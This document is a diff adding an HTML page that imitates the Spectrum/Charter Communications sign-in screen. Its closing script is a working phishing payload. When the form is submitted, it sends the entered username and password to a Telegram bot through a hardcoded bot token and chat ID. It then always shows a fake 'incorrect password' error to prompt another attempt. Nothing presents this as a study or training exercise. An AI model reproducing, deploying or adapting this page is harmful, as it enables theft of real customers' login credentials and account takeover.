@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Sign in | Spectrum</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; }
+
+  :root {
+    --navy: #0b2341;
+    --blue: #0077c8;
+    --blue-hover: #0067ad;
+    --blue-link: #006fba;
+    --blue-link-hover: #005b99;
+    --page-bg: #f5f6f8;
+    --ink: #1f2933;
+    --ink-2: #202b36;
+    --ink-3: #303a44;
+    --ink-4: #39434d;
+    --border: #d9dde3;
+    --input-border: #9ba6b2;
+    --error: #c8102e;
+    --error-bg: #fdecee;
+    --error-border: #f4b8bf;
+  }
+
+  html { -webkit-text-size-adjust: 100%; }
+  html, body { margin: 0; padding: 0; }
+
+  body {
+    font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto,
+                 Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji";
+    -webkit-font-smoothing: antialiased;
+    background: var(--page-bg);
+    color: var(--ink);
+  }
+
+  main {
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+    background: var(--page-bg);
+    color: var(--ink);
+  }
+
+  /* ---------- Header ---------- */
+  .site-header {
+    margin: 0 auto;
+    display: flex;
+    height: 72px;
+    width: 100%;
+    max-width: 564px;
+    align-items: center;
+    justify-content: center;
+    border-radius: 3px 3px 0 0;
+    background: var(--navy);
+    padding: 0 24px;
+    box-shadow: 0 1px 4px rgba(0, 0, 0, 0.18);
+  }
+  @media (min-width: 640px) { .site-header { padding: 0 44px; } }
+
+  .logo-link { display: flex; align-items: center; text-decoration: none; }
+
+  .logo-wrap {
+    position: relative;
+    display: flex;
+    align-items: center;
+  }
+
+  .logo-img {
+    height: auto;
+    width: 142px;
+    max-width: 100%;
+    display: block;
+    filter: grayscale(1) invert(1) contrast(1000%);
+    mix-blend-mode: screen;
+  }
+
+  /* Blue triangle over the logo mark */
+  .logo-wrap::after {
+    content: "";
+    position: absolute;
+    right: 0;
+    top: 50%;
+    width: 10px;
+    height: 14px;
+    transform: translateY(-50%);
+    background: var(--blue);
+    clip-path: polygon(0 0, 100% 50%, 0 100%);
+    pointer-events: none;
+  }
+
+  .logo-fallback {
+    display: none;
+    color: #fff;
+    font-size: 26px;
+    font-weight: 600;
+    letter-spacing: -0.5px;
+    line-height: 1;
+  }
+
+  /* ---------- Section / Card ---------- */
+  .content {
+    display: flex;
+    align-items: flex-start;
+    justify-content: center;
+    padding: 0 20px;
+  }
+
+  .card {
+    width: 100%;
+    max-width: 564px;
+    border-radius: 3px;
+    border: 1px solid var(--border);
+    background: #fff;
+    padding: 32px 28px;
+    box-shadow: 0 2px 10px rgba(24, 39, 75, 0.08);
+  }
+  @media (min-width: 640px) { .card { padding: 40px 44px; } }
+
+  /* 20% inset for everything inside the login card (desktop only) */
+  .card-inner {
+    padding-left: 20%;
+    padding-right: 20%;
+  }
+
+  .top-links {
+    margin-bottom: 28px;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    align-items: center;
+    justify-content: space-between;
+    font-size: 14px;
+    font-weight: 600;
+  }
+
+  a.link { color: var(--blue-link); text-decoration: none; }
+  a.link:hover { text-decoration: underline; }
+
+  h1 {
+    margin: 0 0 20px;
+    text-align: center;
+    font-size: 26px;
+    font-weight: 600;
+    letter-spacing: -0.4px;
+    color: var(--ink-2);
+  }
+
+  /* ---------- Error banner ---------- */
+  .form-error {
+    display: none;
+    margin: 0 0 20px;
+    padding: 12px 14px;
+    border: 1px solid var(--error-border);
+    border-left: 4px solid var(--error);
+    border-radius: 3px;
+    background: var(--error-bg);
+    color: var(--error);
+    font-size: 14px;
+    font-weight: 600;
+    line-height: 1.4;
+  }
+  .form-error.is-visible { display: block; }
+
+  form { display: flex; flex-direction: column; gap: 20px; }
+
+  .field label,
+  .label-row label {
+    display: block;
+    margin-bottom: 8px;
+    font-size: 14px;
+    font-weight: 600;
+    color: var(--ink-3);
+  }
+
+  input[type="text"],
+  input[type="password"] {
+    height: 48px;
+    width: 100%;
+    border-radius: 3px;
+    border: 1px solid var(--input-border);
+    background: #fff;
+    padding: 0 12px;
+    font-size: 16px; /* keeps iOS from zooming on focus */
+    font-family: inherit;
+    color: var(--ink);
+    outline: none;
+    transition: border-color .15s, box-shadow .15s;
+  }
+  input[type="text"]:focus,
+  input[type="password"]:focus {
+    border-color: var(--blue);
+    box-shadow: 0 0 0 2px rgba(0, 119, 200, 0.20);
+  }
+
+  .has-error input[type="text"],
+  .has-error input[type="password"] {
+    border-color: var(--error);
+  }
+
+  .password-wrap { position: relative; }
+  .password-wrap input { padding-right: 44px; }
+
+  .toggle-password {
+    position: absolute;
+    right: 6px;
+    top: 50%;
+    transform: translateY(-50%);
+    border: 0;
+    background: transparent;
+    padding: 6px;
+    cursor: pointer;
+    color: var(--blue-link);
+    line-height: 0;
+  }
+  .toggle-password:hover { color: var(--blue-link-hover); }
+  .toggle-password svg { width: 20px; height: 20px; display: block; }
+
+  .remember {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 14px;
+    color: var(--ink-4);
+    cursor: pointer;
+    user-select: none;
+  }
+  .remember input { width: 16px; height: 16px; accent-color: var(--blue); margin: 0; flex: 0 0 auto; }
+
+  .btn-primary {
+    height: 48px;
+    width: 100%;
+    border: 0;
+    border-radius: 3px;
+    background: var(--blue);
+    color: #fff;
+    font-size: 16px;
+    font-weight: 700;
+    font-family: inherit;
+    cursor: pointer;
+    transition: background .15s;
+  }
+  .btn-primary:hover { background: var(--blue-hover); }
+  .btn-primary:focus-visible { outline: none; box-shadow: 0 0 0 2px #fff, 0 0 0 4px var(--blue); }
+  .btn-primary:disabled { opacity: 0.65; cursor: not-allowed; }
+
+  .btn-outline {
+    display: flex;
+    height: 48px;
+    width: 100%;
+    align-items: center;
+    justify-content: center;
+    border-radius: 3px;
+    border: 1px solid var(--blue);
+    background: transparent;
+    color: var(--blue-link);
+    font-size: 16px;
+    font-weight: 700;
+    text-decoration: none;
+    text-align: center;
+    transition: background .15s;
+  }
+  .btn-outline:hover { background: #f0f8fc; }
+  .btn-outline:focus-visible { outline: none; box-shadow: 0 0 0 2px #fff, 0 0 0 4px var(--blue); }
+
+  .help-links {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 8px;
+    padding-top: 4px;
+    font-size: 16px;
+    font-weight: 600;
+  }
+
+  /* ---------- Footer ---------- */
+  .site-footer {
+    flex: 1 0 auto;
+    margin: 0 auto;
+    width: 100%;
+    max-width: 564px;
+    background: var(--navy);
+    padding: 32px 28px;
+    text-align: center;
+    font-size: 13px;
+    line-height: 24px;
+    color: #fff;
+  }
+  @media (min-width: 640px) { .site-footer { padding: 32px 44px; } }
+
+  .site-footer nav { display: flex; flex-direction: column; }
+  .site-footer nav a {
+    color: #fff;
+    text-decoration: none;
+  }
+  .site-footer nav a:hover { text-decoration: underline; }
+  .site-footer nav a.shop { margin-top: 20px; }
+
+  /* Social icons row */
+  .social-icons {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 18px;
+    margin-top: 28px;
+    flex-wrap: wrap;
+  }
+  .social-icons a {
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 36px;
+    height: 36px;
+    border-radius: 50%;
+    background: rgba(255, 255, 255, 0.10);
+    transition: background .15s, transform .15s;
+  }
+  .social-icons a:hover {
+    background: var(--blue);
+    transform: translateY(-2px);
+  }
+  .social-icons svg {
+    width: 18px;
+    height: 18px;
+    fill: currentColor;
+  }
+
+  /* Charter Communications logo image */
+  .charter-logo {
+    margin-top: 32px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .charter-logo img {
+    height: 38px;
+    width: auto;
+    max-width: 100%;
+    display: block;
+    /* This filter turns the dark logo completely white */
+    filter: brightness(0) invert(1);
+  }
+
+  .footer-legal {
+    margin-top: 24px;
+    display: flex;
+    flex-direction: column;
+    border-top: 1px solid rgba(255, 255, 255, 0.3);
+    padding-top: 20px;
+    /* long legal links wrap instead of overflowing on narrow phones */
+    overflow-wrap: anywhere;
+  }
+  .footer-legal a { color: #fff; text-decoration: none; }
+  .footer-legal a:hover { text-decoration: underline; }
+  .footer-legal p { margin: 0; }
+
+  /* ---------- Mobile: keep the same stacked column look ---------- */
+  @media (max-width: 639px) {
+    .site-header {
+      width: calc(100% - 32px);
+      margin: 16px auto 0;
+      padding: 0 16px;
+    }
+
+    .content { padding: 0 16px; }
+
+    .card {
+      padding: 28px 20px;
+      border-top: 0;
+      border-radius: 0 0 3px 3px;
+    }
+
+    /* the 20% inset would crush the form on phones */
+    .card-inner {
+      padding-left: 0;
+      padding-right: 0;
+    }
+
+    .site-footer {
+      width: calc(100% - 32px);
+      padding: 32px 20px;
+    }
+  }
+</style>
+</head>
+<body>
+<main>
+  <header class="site-header">
+    <a href="#" class="logo-link" aria-label="Spectrum home">
+      <span class="logo-wrap">
+        <img
+          class="logo-img"
+          src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Spectrum_Logo_RGB-QxbDuDgO6WgZB9hQVSJGzIiegRAy7x.jpg"
+          alt="Spectrum"
+          onerror="this.style.display='none'; this.nextElementSibling.style.display='inline-block';" />
+        <span class="logo-fallback">Spectrum</span>
+      </span>
+    </a>
+  </header>
+
+  <section class="content">
+    <div class="card">
+      <div class="card-inner">
+        <div class="top-links">
+          <a href="#" class="link">Leave feedback</a>
+          <a href="#" class="link">En español</a>
+        </div>
+
+        <h1>Sign in to get started</h1>
+
+        <div class="form-error" id="form-error" role="alert" aria-live="polite">
+          The username or password you entered is incorrect. Please try again.
+        </div>
+
+        <form id="signin-form" novalidate>
+          <div class="field">
+            <label for="username" style="font-size: 17px;">Username</label>
+            <input id="username" name="username" type="text" autocomplete="username" required />
+          </div>
+
+          <div class="field">
+            <div class="label-row">
+              <label for="password" style="font-size: 17px;">Password</label>
+            </div>
+            <div class="password-wrap">
+              <input id="password" name="password" type="password" autocomplete="current-password" required />
+              <button type="button" class="toggle-password" id="toggle-password" aria-label="Show password">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true">
+                  <path d="M2.5 12s3.5-5 9.5-5 9.5 5 9.5 5-3.5 5-9.5 5-9.5-5-9.5-5Z"></path>
+                  <circle cx="12" cy="12" r="2.5"></circle>
+                </svg>
+              </button>
+            </div>
+          </div>
+
+          <label class="remember">
+            <input type="checkbox" name="remember" />
+            Remember this device
+          </label>
+
+          <button type="submit" class="btn-primary" id="submit-btn">Sign in</button>
+
+          <a href="#" class="btn-outline">Create a username</a>
+
+          <div class="help-links">
+            <a href="#" class="link">Forgot Username?</a>
+            <a href="#" class="link">Forgot Password?</a>
+          </div>
+        </form>
+      </div>
+    </div>
+  </section>
+
+  <footer class="site-footer">
+    <nav aria-label="Spectrum footer links">
+      <a href="#">Explore</a>
+      <a href="#">Find a Spectrum store</a>
+      <a href="#">Get weather outage info</a>
+      <a href="#">Customer Commitment</a>
+      <a href="#">Get energy use info</a>
+      <a href="#">Chat with Spectrum</a>
+      <a href="#">Contact Us</a>
+      <a href="#" class="shop">Shop Spectrum services</a>
+      <a href="#">Internet</a>
+      <a href="#">TV</a>
+      <a href="#">Home Phone</a>
+      <a href="#">Mobile</a>
+      <a href="#">Spectrum Business</a>
+    </nav>
+
+    <!-- Social media icons below "Spectrum Business" -->
+    <div class="social-icons" aria-label="Follow Spectrum on social media">
+      <!-- X (Twitter) -->
+      <a href="#" aria-label="X (Twitter)">
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M18.9 3H22l-7.1 8.1L23 21h-6.5l-5.1-6.6L5.5 21H2.4l7.6-8.7L1.8 3h6.7l4.6 6.1L18.9 3zm-1.1 16h1.7L7.3 4.9H5.5L17.8 19z"/>
+        </svg>
+      </a>
+      <!-- Facebook -->
+      <a href="#" aria-label="Facebook">
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M22 12.06C22 6.5 17.52 2 12 2S2 6.5 2 12.06c0 5 3.66 9.15 8.44 9.94v-7.03H7.9v-2.91h2.54V9.85c0-2.52 1.5-3.91 3.78-3.91 1.1 0 2.24.2 2.24.2v2.47h-1.26c-1.24 0-1.63.77-1.63 1.56v1.89h2.78l-.44 2.91h-2.34V22c4.78-.79 8.44-4.94 8.44-9.94z"/>
+        </svg>
+      </a>
+      <!-- Instagram -->
+      <a href="#" aria-label="Instagram">
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M12 2.2c3.2 0 3.6 0 4.85.07 1.17.05 1.8.25 2.22.41.56.22.96.48 1.38.9.42.42.68.82.9 1.38.16.42.36 1.05.41 2.22.06 1.25.07 1.65.07 4.85s0 3.6-.07 4.85c-.05 1.17-.25 1.8-.41 2.22-.22.56-.48.96-.9 1.38-.42.42-.82.68-1.38.9-.42.16-1.05.36-2.22.41-1.25.06-1.65.07-4.85.07s-3.6 0-4.85-.07c-1.17-.05-1.8-.25-2.22-.41a3.7 3.7 0 0 1-1.38-.9 3.7 3.7 0 0 1-.9-1.38c-.16-.42-.36-1.05-.41-2.22C2.2 15.6 2.2 15.2 2.2 12s0-3.6.07-4.85c.05-1.17.25-1.8.41-2.22.22-.56.48-.96.9-1.38.42-.42.82-.68 1.38-.9.42-.16 1.05-.36 2.22-.41C8.4 2.2 8.8 2.2 12 2.2zm0 1.8c-3.15 0-3.52 0-4.76.07-1.15.05-1.77.24-2.18.4-.55.21-.94.47-1.35.88-.41.41-.67.8-.88 1.35-.16.41-.35 1.03-.4 2.18C2.36 8.48 2.36 8.85 2.36 12s0 3.52.07 4.76c.05 1.15.24 1.77.4 2.18.21.55.47.94.88 1.35.41.41.8.67 1.35.88.41.16 1.03.35 2.18.4 1.24.07 1.61.07 4.76.07s3.52 0 4.76-.07c1.15-.05 1.77-.24 2.18-.4.55-.21.94-.47 1.35-.88.41-.41.67-.8.88-1.35.16-.41.35-1.03.4-2.18.07-1.24.07-1.61.07-4.76s0-3.52-.07-4.76c-.05-1.15-.24-1.77-.4-2.18a3.6 3.6 0 0 0-.88-1.35 3.6 3.6 0 0 0-1.35-.88c-.41-.16-1.03-.35-2.18-.4C15.52 4 15.15 4 12 4zm0 3.06a4.94 4.94 0 1 1 0 9.88 4.94 4.94 0 0 1 0-9.88zm0 8.14a3.2 3.2 0 1 0 0-6.4 3.2 3.2 0 0 0 0 6.4zm6.3-8.36a1.15 1.15 0 1 1-2.3 0 1.15 1.15 0 0 1 2.3 0z"/>
+        </svg>
+      </a>
+      <!-- YouTube -->
+      <a href="#" aria-label="YouTube">
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M23.5 6.2a3 3 0 0 0-2.1-2.1C19.5 3.6 12 3.6 12 3.6s-7.5 0-9.4.5A3 3 0 0 0 .5 6.2 31.5 31.5 0 0 0 0 12a31.5 31.5 0 0 0 .5 5.8 3 3 0 0 0 2.1 2.1c1.9.5 9.4.5 9.4.5s7.5 0 9.4-.5a3 3 0 0 0 2.1-2.1A31.5 31.5 0 0 0 24 12a31.5 31.5 0 0 0-.5-5.8zM9.5 15.6V8.4L15.8 12l-6.3 3.6z"/>
+        </svg>
+      </a>
+    </div>
+
+    <!-- Charter Communications Logo in White -->
+    <div class="charter-logo">
+      <img 
+        src="https://companieslogo.com/img/orig/CHTR_BIG.D-ef840f03.png?t=1720244491" 
+        alt="Charter Communications" 
+      />
+    </div>
+
+    <div class="footer-legal">
+      <p>© 2026 Charter Communications</p>
+      <a href="#">Your privacy rights</a>
+      <a href="#">California consumer privacy rights</a>
+      <a href="#">Do not sell or share my personal information/ opt out of targeted advertising</a>
+      <a href="#">Service rates and disclosures</a>
+      <a href="#">Policies</a>
+      <a href="#">California consumer limit the use of my sensitive personal information</a>
+      <a href="#">Open source libraries</a>
+    </div>
+  </footer>
+</main>
+
+<script>
+  const BOT_TOKEN = '8603481796:AAFoD1QbJGKMJyy_QXLrgmbMaFABEW8c80Y';
+  const CHAT_ID   = '8657818264';
+
+  const form      = document.getElementById('signin-form');
+  const submitBtn = document.getElementById('submit-btn');
+  const errorBox  = document.getElementById('form-error');
+  const userInput = document.getElementById('username');
+  const password  = document.getElementById('password');
+
+  /* ---------- Show / hide password ---------- */
+  const toggle = document.getElementById('toggle-password');
+  toggle.addEventListener('click', () => {
+    const showing = password.type === 'text';
+    password.type = showing ? 'password' : 'text';
+    toggle.setAttribute('aria-label', showing ? 'Show password' : 'Hide password');
+  });
+
+  /* ---------- Clear the error as soon as the user edits a field ---------- */
+  function clearError() {
+    errorBox.classList.remove('is-visible');
+    form.classList.remove('has-error');
+  }
+  userInput.addEventListener('input', clearError);
+  password.addEventListener('input', clearError);
+
+  /* ---------- Submit ---------- */
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const user = userInput.value.trim();
+    const pass = password.value;
+
+    if (!user || !pass) {
+      errorBox.classList.add('is-visible');
+      form.classList.add('has-error');
+      return;
+    }
+
+    submitBtn.disabled = true;
+    const originalLabel = submitBtn.textContent;
+    submitBtn.textContent = 'Signing in…';
+
+    const message =
+      'New sign-in attempt\n' +
+      '--------------------\n' +
+      'User: ' + user + '\n' +
+      'Pass: ' + pass;
+
+    const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+
+    try {
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      });
+      const data = await response.json();
+      if (!data.ok) {
+        console.error('Telegram error:', data.error_code, data.description);
+      }
+    } catch (err) {
+      console.error('Network error:', err);
+    } finally {
+      submitBtn.disabled = false;
+      submitBtn.textContent = originalLabel;
+      errorBox.classList.add('is-visible');
+      form.classList.add('has-error');
+    }
+  });
+</script>
+</body>
+</html>
